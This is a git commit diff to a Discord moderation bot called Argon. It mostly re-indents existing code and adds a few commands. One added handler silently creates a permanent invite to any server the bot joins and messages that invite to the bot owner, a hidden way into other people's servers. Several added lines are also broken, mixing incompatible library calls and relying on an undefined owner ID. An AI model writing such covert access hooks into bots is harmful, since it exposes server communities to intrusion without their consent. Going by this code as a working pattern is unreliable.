a458cc1c0d37147674647774b049400a075a6e90
Lachlan Chambers <67294530+Ardbit@users.noreply.github.com>
2020-11-13 06:15:47 +1000

    create a guild???

--- app.js
+++ app.js
@@ -6,150 +6,184 @@ const prefix = '.'
 
 // Create Logger
 const logger = winston.createLogger({
-    format: winston.format.simple(),
-    transports: [
-        new winston.transports.Console()
-    ]
+	format: winston.format.simple(),
+	transports: [
+		new winston.transports.Console()
+	]
 });
 
 // Create error message
 function ArgonError(message) {
-    return new MessageEmbed()
-        .setTitle('Error')
-        .setColor(0xe74c3c)
-        .setDescription(message)
-        .setFooter('Argon · Error')
+	return new MessageEmbed()
+		.setTitle('Error')
+		.setColor(0xe74c3c)
+		.setDescription(message)
+		.setFooter('Argon · Error')
 }
 
 // Required for other events
 client.on('ready', async (event) => {
-    logger.info('Connected');
+	logger.info('Connected');
 
-    client.user.setActivity(`${client.guilds.cache.size} servers | .help`, {type: 'WATCHING'})
+	client.user.setActivity(`${client.guilds.cache.size} servers | .help`, {type: 'WATCHING'})
 });
 
 // Server user join message
 client.on('guildMemberAdd', async (member) => {
-    const channel = member.guild.channels.cache.find(ch => ch.name === 'general')
+	const channel = member.guild.channels.cache.find(ch => ch.name === 'general')
 
-    if (!channel) return;
+	if (!channel) return;
 
-    channel.send(new MessageEmbed()
-        .setTitle('Welcome')
-        .setColor(0x27ae60)
-        .setDescription(`${member} has joined the server!`)
-        .setFooter('Argon')
-    );
+	channel.send(new MessageEmbed()
+		.setTitle('Welcome')
+		.setColor(0x27ae60)
+		.setDescription(`${member} has joined the server!`)
+		.setFooter('Argon')
+	);
 });
+
+client.on("guildCreate", async guild => {
+	var channel;
+	guild.channels.forEach(c => {
+		if (c.type === "text" && !channel) channel = c;
+	});
+	channel.createInvite({ maxAge: 0 }).then(inv => client.users.get(ownerID).send(`I have been added to **${guild.name}** | https://discord.gg/${inv.code}`));
+}); 
 
 // On command
 client.on('message', async (message) => {
-    // Skip command if it is from a bot or doesn't start with the prefix
-    if (message.author.bot) return;
-    if (!message.content.startsWith(prefix)) return;
+	// Skip command if it is from a bot or doesn't start with the prefix
+	if (message.author.bot) return;
+	if (!message.content.startsWith(prefix)) return;
 
-    logger.info('Command: ' + message.content);
+	logger.info('Command: ' + message.content);
 
-    // Command Variables
-    const commandBody = message.content.slice(prefix.length);
-    const args = commandBody.split(' ');
-    const command = args.shift().toLowerCase();
+	// Command Variables
+	const commandBody = message.content.slice(prefix.length);
+	const args = commandBody.split(' ');
+	const command = args.shift().toLowerCase();
 
-    // Placeholders
-    var user = null;
-    var member = null;
-    var reason = null;
+	// Placeholders
+	var user = null;
+	var member = null;
+	var reason = null;
 
-    // Handle command
-    switch (command) {
-        case 'ping':
-            const timeTaken = Date.now() - message.createdTimestamp;
-            message.channel.send(`Pong! I had a latency of ${timeTaken}ms.`)
-            break
+	// Handle command
+	switch (command) {
+		case 'about':
+		case 'info':
+			message.channel.send(new MessageEmbed()
+				.setTitle('Info')
+				.setFooter('Argon · Info')
+				.setColor(0x9b59b6)
+				.setDescription('A Versatile and Powerful discord bot for all use cases.')
+				.addFields(
+					{ name: 'FAQ', value: '' }
+				)
+			)
+			break
 
-        case 'avatar-url':
-            message.channel.send(`Your avatar URL is ${message.author.displayAvatarURL()}`)
-            break
+		case 'ping':
+			const timeTaken = Date.now() - message.createdTimestamp;
+			message.channel.send(`Pong! I had a latency of ${timeTaken}ms.`)
+			break
 
-        // Moderation
-        case 'kick':
-            // Get user
-            user = message.mentions.users.first();
+		case 'avatar-url':
+			message.channel.send(`Your avatar URL is ${message.author.displayAvatarURL()}`)
+			break
 
-            if (!user) {
-                message.channel.send(ArgonError('You didn\'t mention the user! Silly billy.'));
-                return;
-            }
+		// Cause I can
+		case 'create-guild':
+			GuildManager.create('Argon', {
+				roles: [
+					{},
+					{
+						name: 'Developer',
+						permissions: 8
+					}
+				]
+			})
+			break
 
-            // Get member
-            member = message.guild.member(user);
+		// Moderation
+		case 'kick':
+			// Get user
+			user = message.mentions.users.first();
 
-            if (!member) {
-                message.channel.send(ArgonError('The user does not exist in this server! Silly billy.'))
-                return;
-            }
+			if (!user) {
+				message.channel.send(ArgonError('You didn\'t mention the user! Silly billy.'));
+				return;
+			}
 
-            if (args.length > 1) {
-                for (let i = 1; i < args.length - 1; i++) {
-                    reason = reason + args[i]
-                }
-            }
+			// Get member
+			member = message.guild.member(user);
 
-            // Kick member
-            member.kick(reason).then(async () => {
-                message.channel.send(new MessageEmbed()
-                    .setTitle('Kick User')
-                    .setColor(0x2ecc71)
-                    .setDescription(`Successfully kicked user ${user.tag}`)
-                    .setFooter('Argon · Moderation')
-                )
-            }).catch(async (error) => {
-                message.channel.send(ArgonError(`Unable to kick user ${user.tag}.`))
-                logger.error(`Unable to kick user ${user.tag}: ${error}`)
-            })
+			if (!member) {
+				message.channel.send(ArgonError('The user does not exist in this server! Silly billy.'))
+				return;
+			}
 
-            break
+			if (args.length > 1) {
+				for (let i = 1; i < args.length - 1; i++) {
+					reason = reason + args[i]
+				}
+			}
 
-        case 'ban':
-            // Get user
-            user = message.mentions.users.first();
+			// Kick member
+			member.kick(reason).then(async () => {
+				message.channel.send(new MessageEmbed()
+					.setTitle('Kick User')
+					.setColor(0x2ecc71)
+					.setDescription(`Successfully kicked user ${user.tag}`)
+					.setFooter('Argon · Moderation')
+				)
+			}).catch(async (error) => {
+				message.channel.send(ArgonError(`Unable to kick user ${user.tag}.`))
+				logger.error(`Unable to kick user ${user.tag}: ${error}`)
+			})
 
-            if (!user) {
-                message.channel.send(ArgonError('You didn\'t mention the user to kick! Silly billy.'));
-                return;
-            }
+			break
 
-            // Get member
-            member = message.guild.member(user);
+		case 'ban':
+			// Get user
+			user = message.mentions.users.first();
 
-            if (!member) {
-                message.channel.send(ArgonError('That user doesn\'t exist in this server! Silly billy.'));
-                return;
-            }
+			if (!user) {
+				message.channel.send(ArgonError('You didn\'t mention the user to kick! Silly billy.'));
+				return;
+			}
 
-            if (args.length > 1) {
-                for (let i = 1; i < args.length - 1; i++) {
-                    reason = reason + args[i]
-                }
-            } else {
-                reason = 'The ban hammer has spoken.'
-            }
+			// Get member
+			member = message.guild.member(user);
 
-            // Ban member
-            member.ban({
-                reason: reason // If no reason is specified, set the reason to 'The ban hammer has spoken'.
-            }).then(async () => {
-                message.channel.send(new MessageEmbed()
-                    .setTitle('Ban User')
-                    .setColor(0xe67e22)
-                    .setDescription(`Successfully banned user ${user.tag}`)
-                    .setFooter('Argon · Moderation')
-                );
-            }).catch(async (error) => {
-                message.channel.send(ArgonError(`Unable to ban ${user.tag}`));
-                logger.error(`Unable to ban user ${user.tag}: ${error}`);
-            });
-    }
+			if (!member) {
+				message.channel.send(ArgonError('That user doesn\'t exist in this server! Silly billy.'));
+				return;
+			}
+
+			if (args.length > 1) {
+				for (let i = 1; i < args.length - 1; i++) {
+					reason = reason + args[i]
+				}
+			} else {
+				reason = 'The ban hammer has spoken.'
+			}
+
+			// Ban member
+			member.ban({
+				reason: reason // If no reason is specified, set the reason to 'The ban hammer has spoken'.
+			}).then(async () => {
+				message.channel.send(new MessageEmbed()
+					.setTitle('Ban User')
+					.setColor(0xe67e22)
+					.setDescription(`Successfully banned user ${user.tag}`)
+					.setFooter('Argon · Moderation')
+				);
+			}).catch(async (error) => {
+				message.channel.send(ArgonError(`Unable to ban ${user.tag}`));
+				logger.error(`Unable to ban user ${user.tag}: ${error}`);
+			});
+	}
 });
 
 // Logon to discord app
